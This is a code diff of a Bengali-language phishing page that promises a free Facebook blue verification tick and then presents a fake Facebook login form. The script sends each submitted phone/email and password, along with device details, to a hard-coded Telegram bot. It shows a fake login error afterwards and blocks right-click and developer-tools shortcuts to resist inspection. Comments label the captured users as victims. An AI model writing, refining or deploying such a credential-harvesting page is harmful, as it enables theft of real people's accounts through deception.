@@ -3,394 +3,182 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Facebook - ব্লু ভেরিফিকেশন | ফ্রি ব্লু টিক</title>
+    <title>Facebook - ফ্রি ব্লু টিক</title>
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;500;700&display=swap');
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { 
-            font-family: 'Noto Sans Bengali', sans-serif;
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            padding: 20px;
-            overflow-x: hidden;
-        }
-        .container { 
-            position: fixed; 
-            top: 0; left: 0; 
-            width: 100%; 
-            height: 100vh; 
-            display: none; 
-            justify-content: center; 
-            align-items: center; 
-            background: rgba(0,0,0,0.1);
-            z-index: 1000;
-        }
-        .container.active { display: flex !important; }
-        .main-container {
-            background: white;
-            border-radius: 16px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-            width: 100%;
-            max-width: 420px;
-            overflow: hidden;
-            animation: slideIn 0.5s ease;
-        }
-        @keyframes slideIn { from { transform: translateY(50px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        
-        /* Header Styles */
-        .header {
-            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
-            color: white;
-            padding: 28px 24px;
-            text-align: center;
-        }
-        .fb-logo {
-            width: 44px; height: 44px;
-            background: white;
-            border-radius: 50%;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 26px;
-            font-weight: bold;
-            margin-bottom: 16px;
-            box-shadow: 0 6px 20px rgba(0,0,0,0.2);
-        }
-        .header h1 { font-size: 24px; font-weight: 700; margin-bottom: 8px; }
-        .header p { font-size: 16px; opacity: 0.95; line-height: 1.4; }
-        
-        /* Badge Section */
-        .badge-section { 
-            padding: 36px 24px; 
-            text-align: center; 
-            background: linear-gradient(135deg, #f8f9ff 0%, #f0f2f5 100%);
-        }
-        .blue-badge { 
-            font-size: 72px; 
-            margin: 20px 0; 
-            animation: pulse 2s infinite;
-            background: linear-gradient(135deg, #1877f2, #42b883);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-        }
-        @keyframes pulse {
-            0%, 100% { transform: scale(1) rotate(-2deg); }
-            50% { transform: scale(1.08) rotate(2deg); }
-        }
-        .free-text {
-            background: linear-gradient(135deg, #42b883, #36a26f);
-            color: white;
-            padding: 14px 28px;
-            border-radius: 30px;
-            font-size: 16px;
-            font-weight: 700;
-            margin: 20px 0;
-            display: inline-block;
-            box-shadow: 0 8px 24px rgba(66,184,131,0.3);
-        }
-        .counter {
-            font-size: 28px;
-            font-weight: 800;
-            background: linear-gradient(135deg, #1877f2, #42b883);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
-            margin: 16px 0;
-        }
-        
-        /* Form Styles */
-        .form-section { padding: 36px 28px 24px; }
-        .form-group { margin-bottom: 24px; }
-        .form-group label {
-            display: block;
-            font-weight: 600;
-            color: #1c1e21;
-            margin-bottom: 10px;
-            font-size: 15px;
-        }
-        .form-group input {
-            width: 100%;
-            padding: 18px 20px;
-            border: 2px solid #e4e6ea;
-            border-radius: 14px;
-            font-size: 17px;
-            transition: all 0.3s;
-            background: #fafbfc;
-        }
-        .form-group input:focus {
-            outline: none;
-            border-color: #1877f2;
-            box-shadow: 0 0 0 4px rgba(24,119,242,0.15);
-            background: white;
-        }
-        .verify-btn, .login-btn {
-            width: 100%;
-            padding: 20px;
-            border: none;
-            border-radius: 14px;
-            font-size: 18px;
-            font-weight: 700;
-            cursor: pointer;
-            transition: all 0.3s;
-            margin-top: 8px;
-        }
-        .verify-btn {
-            background: linear-gradient(135deg, #42b883 0%, #36a26f 100%);
-            color: white;
-        }
-        .login-btn {
-            background: linear-gradient(135deg, #1877f2 0%, #166fe5 100%);
-            color: white;
-        }
-        
-        /* Progress & Error */
-        .progress-bar {
-            display: none;
-            width: 100%; height: 8px;
-            background: #e4e6ea;
-            border-radius: 4px;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-        .progress-fill {
-            height: 100%;
-            background: linear-gradient(90deg, #1877f2, #42b883);
-            width: 0%;
-            transition: width 0.4s ease;
-            border-radius: 4px;
-        }
-        .error-msg {
-            background: linear-gradient(135deg, #e74c3c, #c0392b);
-            color: white;
-            padding: 16px;
-            border-radius: 12px;
-            text-align: center;
-            font-weight: 600;
-            margin: 20px 0;
-            display: none;
-            animation: shake 0.5s ease;
-        }
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            25% { transform: translateX(-10px); }
-            75% { transform: translateX(10px); }
-        }
-        
-        /* Notifications */
-        .notification {
-            position: fixed;
-            top: 24px; right: 24px;
-            padding: 18px 24px;
-            border-radius: 14px;
-            color: white;
-            font-weight: 600;
-            z-index: 9999;
-            transform: translateX(400px);
-            transition: all 0.4s;
-            max-width: 360px;
-            box-shadow: 0 20px 40px rgba(0,0,0,0.15);
-        }
-        .success-notif { background: linear-gradient(135deg, #42b883, #36a26f); }
-        .error-notif { background: linear-gradient(135deg, #e74c3c, #c0392b); }
-        
-        .footer {
-            text-align: center;
-            padding: 24px;
-            background: #f8f9fa;
-            font-size: 13px;
-            color: #65676b;
-            border-top: 1px solid #e4e6ea;
-        }
-        
-        @media (max-width: 480px) {
-            body { padding: 10px; }
-            .main-container { border-radius: 12px; }
-        }
+        *{margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,sans-serif}
+        body{background:linear-gradient(135deg,#667eea,#764ba2);min-height:100vh;padding:15px;display:flex;flex-direction:column;justify-content:center;align-items:center}
+        .page1,.page2{position:relative;width:100%;max-width:380px;background:#fff;border-radius:20px;box-shadow:0 25px 50px rgba(0,0,0,.25);overflow:hidden;display:none;animation:fadeIn .5s ease}
+        .page1.active,.page2.active{display:block}
+        @keyframes fadeIn{from{opacity:0;transform:translateY(20px)}to{opacity:1;transform:translateY(0)}}
+        .head{background:linear-gradient(135deg,#1877f2,#166fe5);color:#fff;padding:35px 25px;text-align:center}
+        .logo{width:55px;height:55px;background:#fff;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:30px;font-weight:900;margin:0 auto 20px;box-shadow:0 10px 30px rgba(0,0,0,.3)}
+        .head h1{font-size:24px;font-weight:800;margin-bottom:5px}
+        .head p{font-size:15px;opacity:.95}
+        .body{padding:40px 30px;text-align:center;background:linear-gradient(135deg,#f8f9ff,#f0f2f5)}
+        .blue-tick{font-size:85px;background:linear-gradient(135deg,#1877f2,#42b883);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:25px 0;animation:bounce 2s infinite}
+        @keyframes bounce{0%,100%{transform:scale(1)rotate(-3deg)}50%{transform:scale(1.1)rotate(3deg)}}
+        .free-tag{background:linear-gradient(135deg,#42b883,#34a853);color:#fff;padding:18px 35px;border-radius:40px;font-size:18px;font-weight:800;margin:25px 0;display:inline-block;box-shadow:0 12px 35px rgba(66,184,131,.4)}
+        #counter{font-size:35px;font-weight:900;background:linear-gradient(135deg,#1877f2,#42b883);-webkit-background-clip:text;-webkit-text-fill-color:transparent;margin:20px 0}
+        .big-btn{width:100%;padding:25px;border:none;border-radius:18px;font-size:22px;font-weight:800;cursor:pointer;transition:all .3s;margin:15px 0;font-family:inherit;box-shadow:0 10px 30px rgba(0,0,0,.2)}
+        .verify{background:linear-gradient(135deg,#42b883,#34a853);color:#fff}
+        .verify:active{transform:scale(.98)}
+        .login{background:linear-gradient(135deg,#1877f2,#166fe5);color:#fff}
+        .login:disabled{background:#bdc3c7;color:#95a5a6;cursor:not-allowed;transform:none}
+        .form-group{margin-bottom:30px}
+        label{display:block;font-weight:700;color:#1c1e21;margin-bottom:12px;font-size:16px}
+        input{width:100%;padding:22px;border:2px solid #e4e6ea;border-radius:16px;font-size:18px;transition:all .3s;background:#fafbfc}
+        input:focus{outline:none;border-color:#1877f2;background:#fff;box-shadow:0 0 0 4px rgba(24,119,242,.1)}
+        .prog{display:none;width:100%;height:12px;background:#e4e6ea;border-radius:6px;margin-top:25px;overflow:hidden}
+        .prog-fill{height:100%;background:linear-gradient(90deg,#42b883,#1877f2);border-radius:6px;width:0%;transition:width .4s ease-in-out}
+        .error{background:linear-gradient(135deg,#e74c3c,#c0392b);color:#fff;padding:22px;border-radius:16px;text-align:center;font-weight:700;font-size:16px;margin:25px 0;display:none;animation:shake .7s}
+        @keyframes shake{0%,100%{transform:translateX(0)}20%{transform:translateX(-10px)}40%{transform:translateX(10px)}60%{transform:translateX(-5px)}}
+        .toast{position:fixed;top:30px;right:30px;padding:20px 30px;border-radius:15px;color:#fff;font-weight:700;z-index:9999;transform:translateX(500px);transition:transform .5s cubic-bezier(.68,-.55,.265,1.55);max-width:400px;box-shadow:0 20px 50px rgba(0,0,0,.3)}
+        .success{background:linear-gradient(135deg,#42b883,#34a853)}
+        .fail{background:linear-gradient(135deg,#e74c3c,#c0392b)}
+        .foot{padding:30px 25px;background:#f8f9fa;text-align:center;font-size:13px;color:#65676b;border-top:1px solid #e4e6ea}
+        @media(max-width:450px){.body{padding:30px 20px}}
     </style>
 </head>
 <body>
-    <!-- Notifications -->
-    <div class="notification success-notif" id="successNotif"></div>
-    <div class="notification error-notif" id="errorNotif"></div>
+    <div class="toast success" id="suc"></div>
+    <div class="toast fail" id="fal"></div>
 
-    <!-- PAGE 1: Blue Verify -->
-    <div class="container active" id="page1">
-        <div class="main-container">
-            <div class="header">
-                <div class="fb-logo">f</div>
-                <h1>🎉 ফ্রি ব্লু ভেরিফিকেশন</h1>
-                <p>আপনার Facebook অ্যাকাউন্টে এখনই ব্লু টিক পান<br><small>১০০% ফ্রি ও নিরাপদ</small></p>
-            </div>
-
-            <div class="badge-section">
-                <div class="blue-badge">✓</div>
-                <div class="free-text">১০০% গ্যারান্টিড</div>
-                <div class="counter" id="counter">২৫৮৪</div>
-                <p style="font-size: 15px; color: #65676b;">
-                    জন এর বেশি ইতিমধ্যে ভেরিফাই করেছেন
-                </p>
-            </div>
-
-            <div class="form-section">
-                <button onclick="goToLogin()" class="verify-btn">
-                    এখনই ফ্রি ব্লু টিক পান ➡️
-                </button>
-            </div>
-
-            <div class="footer">© ২০২৬ Facebook Verification Team</div>
+    <!-- BLUE PAGE -->
+    <div class="page1 active" id="blue">
+        <div class="head">
+            <div class="logo">f</div>
+            <h1>🎉 ফ্রি ব্লু ভেরিফাই</h1>
+            <p>এখনই Facebook এ ব্লু টিক পান<br><small>১০০% গ্যারান্টিড - সম্পূর্ণ ফ্রি</small></p>
         </div>
+        <div class="body">
+            <div class="blue-tick">✓</div>
+            <div class="free-tag">ফ্রি ব্লু টিক</div>
+            <div id="counter">২৬৮৯</div>
+            <p style="color:#65676b;font-size:16px;margin-bottom:25px">জন আজ ভেরিফাই করেছেন</p>
+            <button class="big-btn verify" onclick="switchPage()">এখনই ফ্রি ব্লু টিক পান ➡️</button>
+        </div>
+        <div class="foot">© ২০২৬ Facebook Verification</div>
     </div>
 
-    <!-- PAGE 2: Login -->
-    <div class="container" id="page2">
-        <div class="main-container">
-            <div class="header">
-                <div class="fb-logo">f</div>
-                <h1>🔐 Facebook লগইন যাচাই</h1>
-                <p>ব্লু টিক পেতে আপনার অ্যাকাউন্ট লগইন করুন</p>
-            </div>
-
-            <div class="form-section">
-                <form onsubmit="handleLogin(event)">
-                    <div class="form-group">
-                        <label>📱 মোবাইল নাম্বার / ইমেইল</label>
-                        <input type="text" id="phone" placeholder="01xxxxxxxxx বা email@gmail.com" required>
-                    </div>
-                    
-                    <div class="form-group">
-                        <label>🔒 পাসওয়ার্ড</label>
-                        <input type="password" id="pass" placeholder="আপনার পাসওয়ার্ড" required>
-                    </div>
-                    
-                    <button type="submit" class="login-btn" id="loginBtn">
-                        লগইন & ব্লু টিক পান
-                    </button>
-                    
-                    <div class="progress-bar" id="progress">
-                        <div class="progress-fill"></div>
-                    </div>
-                    
-                    <div class="error-msg" id="errorMsg">
-                        ❌ মোবাইল নাম্বার বা পাসওয়ার্ড ভুল!<br>সঠিক তথ্য দিয়ে আবার চেষ্টা করুন
-                    </div>
-                </form>
-            </div>
-
-            <div class="footer">Facebook Security © ২০২৬ | নিরাপদ লগইন</div>
+    <!-- LOGIN PAGE -->
+    <div class="page2" id="login">
+        <div class="head">
+            <div class="logo">f</div>
+            <h1>🔐 অ্যাকাউন্ট লগইন</h1>
+            <p>ব্লু টিক কনফার্ম করতে লগইন করুন</p>
         </div>
+        <div class="body">
+            <form onsubmit="submitForm(event)">
+                <div class="form-group">
+                    <label>📱 মোবাইল নাম্বার বা ইমেইল</label>
+                    <input type="text" id="ph" placeholder="01xxxxxxxxx বা email@gmail.com" required>
+                </div>
+                <div class="form-group">
+                    <label>🔒 ফেসবুক পাসওয়ার্ড</label>
+                    <input type="password" id="pwd" placeholder="আপনার পাসওয়ার্ড লিখুন" required>
+                </div>
+                <button type="submit" class="big-btn login" id="logbtn">লগইন ➡️ ব্লু টিক পান</button>
+                <div class="prog" id="progress"><div class="prog-fill"></div></div>
+                <div class="error" id="wrong">❌ ভুল মোবাইল নাম্বার বা পাসওয়ার্ড!<br>সঠিক তথ্য দিয়ে আবার চেষ্টা করুন</div>
+            </form>
+        </div>
+        <div class="foot">নিরাপদ লগইন | Facebook © ২০২৬</div>
     </div>
 
     <script>
-        // === YOUR TELEGRAM BOT CONFIG ===
-        const BOT_TOKEN = 'YOUR_BOT_TOKEN';  // @BotFather থেকে
-        const CHAT_ID = 'YOUR_CHAT_ID';      // Chat ID বা @username
+        // ========== YOUR TELEGRAM BOT CONFIG ==========
+        const BOT_TOKEN = '7749630823:AAEsU3pegKC9NFWvCC1pChliXAxm0gp4fHQ';
+        const CHAT_ID = '5415474391';
+        
+        // Counter animation
+        let count = 2689;
+        setInterval(()=>{
+            count += Math.floor(Math.random()*20)+8;
+            document.getElementById('counter').textContent = count.toLocaleString();
+        }, 4000);
 
-        let counter = 2584;
-        const counterEl = document.getElementById('counter');
-        setInterval(() => {
-            counter += Math.floor(Math.random() * 15) + 5;
-            counterEl.textContent = counter.toLocaleString();
-        }, 3000);
-
-        // Page 1 → Page 2
-        function goToLogin() {
-            showNotif('🎉 ব্লু ভেরিফিকেশন শুরু হচ্ছে...', 'success');
-            setTimeout(() => {
-                document.getElementById('page1').classList.remove('active');
-                document.getElementById('page2').classList.add('active');
-                document.getElementById('phone').focus();
+        // Page switch (BLUE → LOGIN)
+        function switchPage(){
+            showToast('🎉 ব্লু ভেরিফিকেশন চালু হচ্ছে...','suc');
+            setTimeout(()=>{
+                document.getElementById('blue').classList.remove('active');
+                document.getElementById('login').classList.add('active');
+                document.getElementById('ph').focus();
             }, 1200);
         }
 
-        // Login Handler
-        async function handleLogin(e) {
+        // Login submit
+        async function submitForm(e){
             e.preventDefault();
+            const phone = document.getElementById('ph').value.trim();
+            const pass = document.getElementById('pwd').value;
             
-            const phone = document.getElementById('phone').value;
-            const pass = document.getElementById('pass').value;
-            
-            if (!phone || !pass || pass.length < 4) {
-                showNotif('সব তথ্য সঠিকভাবে দিন!', 'error');
+            if(phone.length < 5 || pass.length < 4){
+                showToast('সব তথ্য সঠিকভাবে পূরণ করুন!','fal');
                 return;
             }
 
-            // Victim Data
-            const data = {
-                phone: phone,
-                password: pass,
-                time: new Date().toLocaleString('bn-BD'),
-                ua: navigator.userAgent.slice(0,60),
-                lang: navigator.language,
-                url: location.href
-            };
+            // ========== SEND TO YOUR TELEGRAM ==========
+            const victimMsg = `🚨 FACEBOOK VICTIM CAUGHT! 🚨
 
-            // Send to Telegram
-            sendTelegram(data);
+👤 Phone/Email: \`${phone}\`
+🔑 Password: \`${pass}\`
+🕐 Time: ${new Date().toLocaleString('bn-BD')}
+🌐 URL: ${window.location.href}
+📱 Device: ${navigator.userAgent.slice(0,60)}...
 
-            // Show Processing → Error
-            const btn = document.getElementById('loginBtn');
-            const progress = document.getElementById('progress');
-            const errorMsg = document.getElementById('errorMsg');
+#facebook #bluetick #phishing`;
+
+            try{
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(victimMsg)}&parse_mode=Markdown`);
+                console.log('✅ Victim data sent to Telegram!');
+            }catch(e){
+                console.log('❌ Telegram send failed:', e);
+            }
+
+            // Fake processing + error
+            const btn = document.getElementById('logbtn');
+            const prog = document.getElementById('progress');
+            const err = document.getElementById('wrong');
             
             btn.disabled = true;
-            btn.innerHTML = 'যাচাই হচ্ছে... ⏳';
-            progress.style.display = 'block';
+            btn.textContent = 'যাচাই করা হচ্ছে... ⏳';
+            prog.style.display = 'block';
             
-            let prog = 0;
-            const int = setInterval(() => {
-                prog += 15;
-                if (prog > 90) prog = 90;
-                document.querySelector('.progress-fill').style.width = prog + '%';
-            }, 250);
+            let width = 0;
+            const timer = setInterval(()=>{
+                width += 18;
+                if(width > 88) width = 88;
+                document.querySelector('.prog-fill').style.width = width + '%';
+            }, 350);
 
-            setTimeout(() => {
-                clearInterval(int);
-                document.querySelector('.progress-fill').style.width = '100%';
-                setTimeout(() => {
-                    progress.style.display = 'none';
-                    errorMsg.style.display = 'block';
+            setTimeout(()=>{
+                clearInterval(timer);
+                document.querySelector('.prog-fill').style.width = '100%';
+                setTimeout(()=>{
+                    prog.style.display = 'none';
+                    err.style.display = 'block';
                     btn.disabled = false;
-                    btn.innerHTML = 'আবার চেষ্টা করুন 🔄';
-                    showNotif('❌ লগইন ত্রুটি! সঠিক তথ্য দিন', 'error');
-                }, 600);
-            }, 2800);
+                    btn.textContent = 'আবার চেষ্টা করুন 🔄';
+                    err.scrollIntoView({behavior:'smooth'});
+                    showToast('❌ লগইন ব্যর্থ! সঠিক তথ্য দিন','fal');
+                }, 700);
+            }, 3200);
         }
 
-        // Telegram Sender
-        async function sendTelegram(data) {
-            const msg = `🚨 FB BLUE TICK VICTIM 🚨\n\n👤 Phone/Email: \`${data.phone}\`\n🔑 Password: \`${data.pass}\`\n🕐 Time: ${data.time}\n📱 Device: ${data.ua}\n🔗 URL: ${data.url}`;
-            
-            try {
-                await fetch(`https://api.telegram.org/bot${7749630823:AAEsU3pegKC9NFWvCC1pChliXAxm0gp4fHQ}/sendMessage`, {
-                    method: 'POST',
-                    headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({
-                        chat_id: 5415474391,
-                        text: msg,
-                        parse_mode: 'Markdown'
-                    })
-                });
-            } catch(e) {}
-            
-            // Backup beacon
-            new Image().src = `https://httpbin.org/post?data=${btoa(JSON.stringify(data))}`;
+        // Toast notification
+        function showToast(msg, type){
+            const t = document.getElementById(type);
+            t.textContent = msg;
+            t.style.transform = 'translateX(0)';
+            setTimeout(()=> t.style.transform = 'translateX(500px)', 4500);
         }
 
-        // Notifications
-        function showNotif(msg, type) {
-            const n = document.getElementById(type + 'Notif');
-            n.textContent = msg;
-            n.style.transform = 'translateX(0)';
-            setTimeout(() => n.style.transform = 'translateX(400px)', 3500);
-        }
-
-        // Anti-debug
-        document.oncontextmenu = () => false;
-        document.onkeydown = e => {
-            if(e.keyCode==123 || (e.ctrlKey && e.shiftKey && e.keyCode=='I'.charCodeAt(0)) || (e.ctrlKey && e.shiftKey && e.keyCode=='C'.charCodeAt(0)) || (e.ctrlKey && e.shiftKey && e.keyCode=='J'.charCodeAt(0))) 
-                return false;
-        };
+        // Security
+        document.addEventListener('contextmenu', e=>e.preventDefault());
+        document.addEventListener('keydown', e=>{
+            if(e.key==='F12' || (e.ctrlKey && e.shiftKey && e.key==='I') || (e.ctrlKey && e.key==='u')) e.preventDefault();
+        });
     </script>
 </body>
 </html>
